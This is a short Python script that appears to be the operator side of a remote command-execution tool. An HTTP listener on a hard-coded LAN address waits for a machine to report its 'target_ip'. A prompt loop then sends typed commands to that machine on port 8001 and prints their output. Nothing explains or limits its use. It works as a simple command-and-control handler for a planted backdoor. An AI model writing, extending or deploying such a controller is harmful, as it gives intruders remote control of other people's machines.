from http.server import HTTPServer, BaseHTTPRequestHandler
import http.client, urllib.parse 
import multiprocessing
import threading
import json
from urllib import parse
target_ip = []

class RequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        post_body = self.rfile.read1()
        if len(target_ip) == 0:
            body = parse.parse_qs(str(post_body, 'UTF-8'))
            print(body, body["text"], body["text"][0])
            res = json.loads(body["text"][0])
            if "target_ip" in res:
                print(res, "target_ip" in res)
                target_ip.append(res["target_ip"])
                print("tagrget ip", target_ip)
        print(post_body)

def run_server(server_class=HTTPServer, handler_class=RequestHandler):
    server_address = ('192.168.1.232', 8000)
    httpd = server_class(server_address, handler_class)
    httpd.serve_forever()


def run_client():
    con_est = 0
    while not con_est:
        if len(target_ip) != 0:
            print("came herte", target_ip, not target_ip)
            conn = http.client.HTTPConnection(target_ip[0], 8001)
            con_est = 1
            break

    while len(target_ip) != 0:
        print("enter the command to execute")
        cmd = input('fixoc-#')
        params = urllib.parse.urlencode({"text": cmd})
        headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/plain"}
        try:
            conn.request('POST', "", params, headers)
            res = conn.getresponse()
            print(res.status)
            data = res.read()
            print("output of command ", data.decode("utf-8"))
        except Exception as e:
            print("Could not send request", e)

proc1 = threading.Thread(target=run_server)
proc1.deamon = True
proc1.start()
run_client()

#proc1 = multiprocessing.Process(target=run_server)
#proc2 = multiprocessing.Process(target=run_client)

#proc2.start()
#proc1.start()

